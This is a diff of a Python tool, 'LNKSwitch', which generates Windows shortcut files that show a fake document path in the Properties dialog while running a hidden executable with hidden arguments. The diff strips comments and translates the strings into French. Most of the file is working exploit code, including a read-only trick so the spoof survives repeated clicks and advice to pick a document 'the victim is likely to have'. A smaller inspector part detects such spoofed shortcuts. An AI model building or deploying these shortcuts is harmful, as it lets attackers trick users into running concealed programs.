@@ -1,38 +1,3 @@
-#!/usr/bin/env python3
-"""
-lnkswitch_generator.py
-══════════════════════════════════════════
-LNKSwitch — LNK target spoofing using Variant 4.
-
-HOW THE TRICK WORKS
-────────────────────────────────
-The EVDB (EnvironmentVariableDataBlock) has two path fields:
-  - TargetAnsi    (260 bytes)  → real execution target
-  - TargetUnicode (520 bytes)  → intentionally left NULL
-
-When TargetUnicode is all null bytes, Explorer detects a mismatch and:
-  - DISPLAYS the LinkTargetIDList path in Properties  (the lie, we control this)
-  - EXECUTES the TargetAnsi path when opened          (the truth is hidden)
-  - DISABLES the Target field in Properties (greyed out, uneditable)
-  - HIDES any command-line arguments from the Properties dialog
-
-LAYOUT
-──────
-  [Header 76B]
-  [IDListSize 2B][IDList for DISPLAY path]  <- shown in Properties (fake)
-  [StringData: icon, args if any]
-  [EVDB 788B: TargetAnsi=real target, TargetUnicode=all zeros]
-
-USAGE
-─────
-  python lnkswitch_generator.py --target  "C:\\Windows\\System32\\calc.exe" --display "C:\\Finance\\Q1_Invoice_2025.pdf" --output  invoice.lnk
-
-  python lnkswitch_generator.py --inspect suspicious.lnk
-
-Requirements: Python 3.9+, OS Windows, PowerShell
-For educational and authorised security testing only.
-"""
-
 import argparse
 import os
 import struct
@@ -42,13 +7,8 @@ import tempfile
 from pathlib import Path
 from typing import Optional
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# LNK format constants
-# ─────────────────────────────────────────────────────────────────────────────
-
 HEADER_SIZE      = 0x4C
-EVDB_BLOCK_SIZE  = 0x314   # 788 bytes, always !
+EVDB_BLOCK_SIZE  = 0x314
 EVDB_SIGNATURE   = 0xA0000001
 EVDB_ANSI_LEN    = 260
 EVDB_UNICODE_LEN = 520
@@ -60,7 +20,6 @@ LINK_CLSID = bytes([
     0x00, 0x00, 0x00, 0x00, 0x00, 0x46
 ])
 
-# LinkFlags
 F_HAS_IDLIST    = 0x00000001
 F_HAS_LINK_INFO = 0x00000002
 F_HAS_NAME      = 0x00000004
@@ -73,23 +32,11 @@ F_HAS_EXP_STR   = 0x00000200
 
 ILLEGAL_CHARS = set('<>:"/|?*')
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Dynamic IDList extraction
-# ─────────────────────────────────────────────────────────────────────────────
-
 def extract_idlist(target_path: str) -> bytes:
-    """
-    Dynamically extract a valid LinkTargetIDList for target_path by asking
-    PowerShell/WScript.Shell to create a legitimate shortcut, then stealing
-    the IDList bytes from the resulting binary.
-
-    Returns raw IDList bytes WITHOUT the 2-byte size prefix.
-    """
     if not os.path.exists(target_path):
         raise FileNotFoundError(
-            f"Target not found: {target_path!r}\n"
-            "The path must exist on disk for IDList extraction."
+            f"Cible introuvable : {target_path!r}\n"
+            "Le chemin doit exister sur le disque pour l'extraction de l'IDList."
         )
 
     tmp = tempfile.mktemp(suffix='.lnk')
@@ -109,14 +56,14 @@ def extract_idlist(target_path: str) -> bytes:
             capture_output=True, text=True, timeout=15
         )
     except FileNotFoundError:
-        raise RuntimeError("PowerShell not found. Windows + PowerShell required.")
+        raise RuntimeError("PowerShell introuvable. Windows + PowerShell requis.")
     except subprocess.TimeoutExpired:
-        raise RuntimeError("PowerShell timed out.")
+        raise RuntimeError("Délai d'exécution PowerShell dépassé.")
 
     if r.returncode != 0:
-        raise RuntimeError(f"PowerShell failed:\n{r.stderr.strip()}")
+        raise RuntimeError(f"Échec de PowerShell :\n{r.stderr.strip()}")
     if not os.path.exists(tmp):
-        raise RuntimeError("Temp LNK not created by PowerShell... WeakShell ???")
+        raise RuntimeError("Le LNK temporaire n'a pas été créé par PowerShell... WeakShell ???")
 
     try:
         data = Path(tmp).read_bytes()
@@ -127,89 +74,55 @@ def extract_idlist(target_path: str) -> bytes:
             pass
 
     if len(data) < HEADER_SIZE + 2:
-        raise RuntimeError(f"Generated LNK too short: {len(data)} bytes")
+        raise RuntimeError(f"LNK généré trop court : {len(data)} octets")
 
     gen_flags = struct.unpack_from('<I', data, 0x14)[0]
     if not (gen_flags & F_HAS_IDLIST):
         raise RuntimeError(
-            "WScript.Shell did not generate an IDList for this target.\n"
-            "Use a full absolute path to the executable."
+            "WScript.Shell n'a pas généré d'IDList pour cette cible.\n"
+            "Utilisez un chemin absolu complet vers l'exécutable."
         )
 
     idlist_size  = struct.unpack_from('<H', data, HEADER_SIZE)[0]
     idlist_bytes = data[HEADER_SIZE + 2 : HEADER_SIZE + 2 + idlist_size]
 
     if len(idlist_bytes) != idlist_size:
-        raise RuntimeError("IDList truncated in generated LNK.")
+        raise RuntimeError("IDList tronquée dans le LNK généré.")
 
     return idlist_bytes
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# EVDB construction
-# ─────────────────────────────────────────────────────────────────────────────
-
 def build_evdb_variant4(real_target: str) -> bytes:
-    """
-    Build the 788-byte EnvironmentVariableDataBlock:
-      - TargetAnsi    = real execution target   (what actually runs)
-      - TargetUnicode = all null bytes          (its intentionally empty)
-
-    When Explorer sees a populated TargetAnsi but empty TargetUnicode,
-    it recognises the inconsistency and:
-      - Shows the LinkTargetIDList path in Properties instead (our fake display path)
-      - Greys out the Target field (user cannot click or inspect it)
-      - Hides command-line arguments from the Properties dialog
-      - Executes TargetAnsi when the LNK is opened
-
-    No illegal characters needed. No normalization possible. Icon changes
-    by the user do not repair the EVDB because the structure looks superficially
-    valid it's the ansi mismatch that triggers the behaviour, not a detectable error.
-    """
     assert len(real_target) < EVDB_ANSI_LEN, \
-        f"Real target path too long: {len(real_target)} chars (max {EVDB_ANSI_LEN - 1})"
+        f"Chemin de cible réelle trop long : {len(real_target)} caractères (max {EVDB_ANSI_LEN - 1})"
 
     buf = bytearray(EVDB_BLOCK_SIZE)
 
-    struct.pack_into('<I', buf, 0, EVDB_BLOCK_SIZE)  # BlockSize  = 788
-    struct.pack_into('<I', buf, 4, EVDB_SIGNATURE)   # Signature  = 0xA0000001
+    struct.pack_into('<I', buf, 0, EVDB_BLOCK_SIZE)
+    struct.pack_into('<I', buf, 4, EVDB_SIGNATURE)
 
-    # TargetAnsi: offset 8, 260 bytes — the REAL target
+    # TargetAnsi: offset 8, 260 bytes
     ansi = real_target.encode('windows-1252', errors='replace')
     ansi = ansi[:EVDB_ANSI_LEN - 1]
     buf[8 : 8 + len(ansi)] = ansi
 
-    # TargetUnicode: offset 268, 520 bytes — intentionally ALL ZEROS
-    # (already zeroed by bytearray initialisation)
-
     assert len(buf) == EVDB_BLOCK_SIZE
     return bytes(buf)
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Header & StringData helpers
-# ─────────────────────────────────────────────────────────────────────────────
-
 def build_header(flags: int, show_cmd: int = 1) -> bytes:
-    """Build the fixed 76-byte ShellLinkHeader."""
+    """Construit le ShellLinkHeader fixe de 76 octets."""
     buf = bytearray(HEADER_SIZE)
     struct.pack_into('<I', buf, 0x00, HEADER_SIZE)
     buf[0x04:0x14] = LINK_CLSID
     struct.pack_into('<I', buf, 0x14, flags)
-    struct.pack_into('<I', buf, 0x18, 0x00000020)   # FILE_ATTRIBUTE_NORMAL
+    struct.pack_into('<I', buf, 0x18, 0x00000020)
     struct.pack_into('<I', buf, 0x3C, show_cmd)
     return bytes(buf)
 
 
 def str_entry(s: str) -> bytes:
-    """[2-byte CountCharacters LE][UTF-16LE, NOT null-terminated]"""
     enc = s.encode('utf-16-le')
     return struct.pack('<H', len(s)) + enc
-
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Full LNK assembler
-# ─────────────────────────────────────────────────────────────────────────────
 
 def build_lnkswitch(
     real_target:  str,
@@ -220,23 +133,14 @@ def build_lnkswitch(
     icon_index:   int = 0,
     show_cmd:     int = 1,
 ) -> bytes:
-    """
-    Build a complete Variant 4 LNKSwitch .lnk file.
 
-    real_target:  path that actually executes  (goes into EVDB TargetAnsi)
-    display_path: path shown in Properties     (goes into LinkTargetIDList)
-    """
-
-    # Extract IDList for the FAKE display path (what Properties shows)
-    print(f"  [*] Extracting IDList for display path: {display_path}")
+    print(f"  [*] Extraction de l'IDList pour le chemin affiché : {display_path}")
     display_idlist = extract_idlist(display_path)
-    print(f"  [+] Display IDList: {len(display_idlist)} bytes")
+    print(f"  [+] IDList affichée : {len(display_idlist)} octets")
 
-    # Build EVDB with real target in TargetAnsi, TargetUnicode zeroed
-    print(f"  [*] Building EVDB: TargetAnsi={real_target!r}, TargetUnicode=NULL")
+    print(f"  [*] Construction EVDB : TargetAnsi={real_target!r}, TargetUnicode=NULL")
     evdb = build_evdb_variant4(real_target)
 
-    # Flags
     flags = F_HAS_IDLIST | F_HAS_EXP_STR | F_IS_UNICODE
     if working_dir: flags |= F_HAS_WORK_DIR
     if arguments:   flags |= F_HAS_ARGS
@@ -245,7 +149,6 @@ def build_lnkswitch(
     header  = build_header(flags, show_cmd)
     idl_sec = struct.pack('<H', len(display_idlist)) + display_idlist
 
-    # StringData (spec order: WORKING_DIR, ARGUMENTS, ICON_LOCATION)
     str_sec = b''
     if working_dir:
         str_sec += str_entry(working_dir)
@@ -260,20 +163,14 @@ def build_lnkswitch(
 
     return header + idl_sec + str_sec + evdb
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Inspector / triage
-# ─────────────────────────────────────────────────────────────────────────────
-
 def inspect_lnk(filepath: str):
-    """Parse an LNK and detect LNKSwitch indicators (both Variant 2 and 4)."""
     print(f"\n{'='*62}")
-    print(f"  LNKSwitch Inspector: {os.path.basename(filepath)}")
+    print(f"  Inspecteur LNKSwitch : {os.path.basename(filepath)}")
     print(f"{'='*62}")
 
     data = Path(filepath).read_bytes()
     if len(data) < HEADER_SIZE + 2:
-        print("[!] File too short.")
+        print("[!] Fichier trop court.")
         return
 
     flags  = struct.unpack_from('<I', data, 0x14)[0]
@@ -316,7 +213,7 @@ def inspect_lnk(filepath: str):
 
         print(f"\n  IDList  : {idlist_size} bytes")
         if idlist_hint:
-            print(f"  IDList hint (Properties shows): {idlist_hint!r}")
+            print(f"  Indice IDList (affiché dans Propriétés) : {idlist_hint!r}")
 
     if flags & F_HAS_LINK_INFO:
         li_size = struct.unpack_from('<I', data, offset)[0]
@@ -340,7 +237,7 @@ def inspect_lnk(filepath: str):
         trunc  = val[:100] + ('...' if len(val) > 100 else '')
         print(f"  {label:<14}: {trunc!r}")
         if label == 'Arguments' and len(val) > 260:
-            print(f"    ⚠  Arg length {len(val)} > 260 — possible CVE-2025-9491 padding!")
+            print(f"    ⚠  Longueur des arguments {len(val)} > 260 — padding CVE-2025-9491 possible !")
 
     evdb_ansi = evdb_uni = None
     while offset + 8 <= len(data):
@@ -369,30 +266,28 @@ def inspect_lnk(filepath: str):
     print(f"\n  {'─'*56}")
 
     if (flags & F_HAS_IDLIST) and (flags & F_HAS_EXP_STR):
-        # Variant 4: TargetAnsi populated, TargetUnicode null
         if evdb_ansi and not evdb_uni:
-            print(f"  🔴  LNKSWITCH DETECTED  [Variant 4 — null TargetUnicode]")
-            print(f"       Properties shows (IDList)  : {idlist_hint!r}")
-            print(f"       Actually executes (EVDB)   : {evdb_ansi!r}")
-            print(f"       Target field is greyed out.")
-            print(f"\n       DO NOT open this file.")
-        # Variant 2: EVDB contains illegal path char
+            print(f"  🔴  LNKSWITCH DÉTECTÉ  [Variante 4 — TargetUnicode nul]")
+            print(f"       Propriétés affiche (IDList) : {idlist_hint!r}")
+            print(f"       Exécute réellement (EVDB)   : {evdb_ansi!r}")
+            print(f"       Le champ Cible est grisé.")
+            print(f"\n       N'ouvrez pas ce fichier.")
         elif evdb_ansi:
             illegal = [c for c in evdb_ansi if c in ILLEGAL_CHARS]
             if illegal:
                 visible = evdb_ansi.strip('"').strip()
-                print(f"  🔴  LNKSWITCH DETECTED  [Variant 2 — invalid EVDB path]")
-                print(f"       Illegal chars           : {illegal}")
-                print(f"       Properties shows (EVDB) : {visible!r}")
+                print(f"  🔴  LNKSWITCH DÉTECTÉ  [Variante 2 — chemin EVDB invalide]")
+                print(f"       Caractères illégaux       : {illegal}")
+                print(f"       Propriétés affiche (EVDB) : {visible!r}")
                 if idlist_hint:
-                    print(f"       Actually executes (IDL) : {idlist_hint!r}")
-                print(f"\n       DO NOT open this file.")
+                    print(f"       Exécute réellement (IDL) : {idlist_hint!r}")
+                print(f"\n       N'ouvrez pas ce fichier.")
             else:
-                print("  🟡  HasIDList + HasExpString both set — review manually.")
+                print("  🟡  HasIDList + HasExpString tous deux définis — vérification manuelle conseillée.")
         else:
-            print("  🟡  HasExpString with null EVDB — possible Variant 1.")
+            print("  🟡  HasExpString avec EVDB nul — Variante 1 possible.")
     else:
-        print("  🟢  No LNKSwitch signature detected.")
+        print("  🟢  Aucune signature LNKSwitch détectée.")
     print()
 
 
@@ -402,30 +297,30 @@ def inspect_lnk(filepath: str):
 
 def main():
     parser = argparse.ArgumentParser(
-        description='LNKSwitch — Variant 4 LNK spoofing generator & inspector',
+                description='LNKSwitch — Générateur et inspecteur de spoofing LNK Variante 4',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-⚠  For educational and authorised security testing ONLY.
+⚠  Réservé à l'apprentissage et aux tests de sécurité autorisés UNIQUEMENT.
 
-Uses Variant 4: TargetAnsi=real target, TargetUnicode=null.
-  - Survives icon changes by the user (no illegal chars to normalize)
-  - Target field is greyed out in Properties
-  - Arguments are hidden automatically
+Utilise la Variante 4 : TargetAnsi=cible réelle, TargetUnicode=nul.
+    - Survit aux changements d'icône par l'utilisateur (aucun caractère illégal à normaliser)
+    - Le champ Cible est grisé dans Propriétés
+    - Les arguments sont masqués automatiquement
 
-REQUIREMENT: --display must point to a real existing file on the target
-system (it becomes the IDList — Explorer needs to resolve it for display).
-Use any plausible document the victim is likely to have, like a real PDF.
+PRÉREQUIS : --display doit pointer vers un fichier réel existant sur le
+système cible (il devient l'IDList — Explorer doit pouvoir le résoudre pour l'affichage).
+Utilisez un document plausible que la cible est susceptible d'avoir, par exemple un vrai PDF.
 
-Examples:
+Exemples :
 
-  Generate (show a real PDF path, execute calc):
+    Générer (afficher un vrai chemin PDF, exécuter calc) :
     python lnkswitch_generator.py \\
         --target    "C:\\Windows\\System32\\calc.exe" \\
         --display   "C:\\Users\\Public\\Documents\\report.pdf" \\
         --read-only \\
         --output    report.lnk
 
-  With icon and hidden payload:
+    Avec icône et charge utile masquée :
     python lnkswitch_generator.py \\
         --target     "C:\\Windows\\System32\\cmd.exe" \\
         --args       "/c whoami > C:\\Users\\Public\\out.txt" \\
@@ -435,59 +330,59 @@ Examples:
         --read-only \\
         --output     report.lnk
 
-  Inspect a suspicious LNK:
+    Inspecter un LNK suspect :
     python lnkswitch_generator.py --inspect suspicious.lnk
         """
     )
 
     parser.add_argument('--inspect', metavar='FILE',
-                        help='Inspect an existing LNK for spoofing indicators')
+                        help='Inspecter un LNK existant à la recherche d’indicateurs de spoofing')
     parser.add_argument('--target', metavar='PATH',
-                        help='Real execution target (goes into EVDB TargetAnsi)')
+                        help='Vraie cible d’exécution (placée dans EVDB TargetAnsi)')
     parser.add_argument('--display', metavar='PATH',
-                        help='Path shown in Properties (goes into IDList — must exist on disk)')
+                        help='Chemin affiché dans Propriétés (placé dans IDList — doit exister sur le disque)')
     parser.add_argument('--output', metavar='FILE', default='output.lnk')
     parser.add_argument('--args', metavar='STRING',
-                        help='Command-line arguments (hidden from Properties automatically)')
+                        help='Arguments de ligne de commande (masqués automatiquement dans Propriétés)')
     parser.add_argument('--working-dir', metavar='PATH')
     parser.add_argument('--icon', metavar='PATH[,INDEX]',
-                        help='Icon path, optionally with index (e.g. shell32.dll,153)')
+                        help='Chemin de l’icône, avec index optionnel (ex. shell32.dll,153)')
     parser.add_argument('--icon-index', metavar='N', type=int, default=0,
-                        help='Icon index (only used if --icon has no comma)')
+                        help='Index de l’icône (utilisé seulement si --icon ne contient pas de virgule)')
     parser.add_argument('--minimized', action='store_true',
-                        help='Run target minimized/hidden (ShowCommand=7)')
+                        help='Lancer la cible minimisée/cachée (ShowCommand=7)')
     parser.add_argument('--read-only', action='store_true',
-                        help='Set FILE_ATTRIBUTE_READONLY on the output LNK so Explorer '
-                             'cannot repair the ansi/unicode mismatch after first execution. '
-                             'Without this flag, the spoof is destroyed on first click.')
+                        help='Appliquer FILE_ATTRIBUTE_READONLY au LNK de sortie afin qu’Explorer '
+                            'ne puisse pas corriger le décalage ansi/unicode après la première exécution. '
+                            'Sans ce drapeau, le spoof est détruit au premier clic.')
     parser.add_argument('--dry-run', action='store_true',
-                        help='Assemble but do not write to disk')
+                        help='Assembler sans écrire sur le disque')
 
     args = parser.parse_args()
 
     if args.inspect:
         if not os.path.exists(args.inspect):
-            print(f"[!] File not found: {args.inspect}")
+            print(f"[!] Fichier introuvable : {args.inspect}")
             sys.exit(1)
         inspect_lnk(args.inspect)
         sys.exit(0)
 
     if not args.target or not args.display:
-        parser.error("--target and --display are both required.")
+        parser.error("--target et --display sont tous deux requis.")
 
     show_cmd = 7 if args.minimized else 1
 
     print()
-    print("  LNKSwitch Generator  [Variant 4]")
+    print("  Générateur LNKSwitch  [Variante 4]")
     print("  ─────────────────────────────────")
-    print(f"  Real target  : {args.target}  (hidden — EVDB TargetAnsi)")
-    print(f"  Display path : {args.display}  (shown — IDList)")
-    print(f"  Output       : {args.output}")
-    if args.args:        print(f"  Arguments    : {args.args}  (hidden automatically)")
-    if args.working_dir: print(f"  Working dir  : {args.working_dir}")
+    print(f"  Cible réelle  : {args.target}  (masquée — EVDB TargetAnsi)")
+    print(f"  Chemin affiché: {args.display}  (visible — IDList)")
+    print(f"  Sortie        : {args.output}")
+    if args.args:        print(f"  Arguments     : {args.args}  (masqués automatiquement)")
+    if args.working_dir: print(f"  Répertoire    : {args.working_dir}")
     if args.icon:
         icon_display = args.icon if ',' in args.icon else f"{args.icon},{args.icon_index}"
-        print(f"  Icon         : {icon_display}")
+        print(f"  Icône         : {icon_display}")
     print()
 
     try:
@@ -501,11 +396,11 @@ Examples:
             show_cmd     = show_cmd,
         )
     except (FileNotFoundError, RuntimeError) as e:
-        print(f"\n  [!] Error: {e}")
+        print(f"\n  [!] Erreur : {e}")
         sys.exit(1)
 
     if args.dry_run:
-        print(f"  [~] Dry run — {len(lnk)} bytes, not written.")
+        print(f"  [~] Exécution à blanc — {len(lnk)} octets, non écrit.")
         sys.exit(0)
 
     out = Path(args.output)
@@ -518,20 +413,20 @@ Examples:
         import stat
         current = os.stat(out).st_mode
         os.chmod(out, current & ~stat.S_IWRITE)
-        ro_note = "  (read-only — spoof survives repeated clicks)"
+        ro_note = "  (lecture seule — le spoof survit aux clics répétés)"
     else:
-        ro_note = "  (writable — Explorer will repair on first click)"
+        ro_note = "  (modifiable — Explorer corrigera au premier clic)"
 
-    print(f"  [+] Written: {out.resolve()}  ({len(lnk)} bytes)")
+    print(f"  [+] Écrit : {out.resolve()}  ({len(lnk)} octets)")
     print()
-    print("  Result summary")
+    print("  Résumé")
     print("  ──────────────")
-    print(f"  Properties dialog shows : {args.display!r}")
-    print(f"  Target field            : greyed out (uneditable)")
-    print(f"  Double-click executes   : {args.target!r}")
+    print(f"  La boîte Propriétés affiche : {args.display!r}")
+    print(f"  Champ Cible                 : grisé (non modifiable)")
+    print(f"  Le double-clic exécute      : {args.target!r}")
     if args.args:
-        print(f"  Arguments               : hidden from Properties")
-    print(f"  File attribute          :{ro_note}")
+        print(f"  Arguments                   : masqués dans Propriétés")
+    print(f"  Attribut du fichier         :{ro_note}")
     print()
 
 
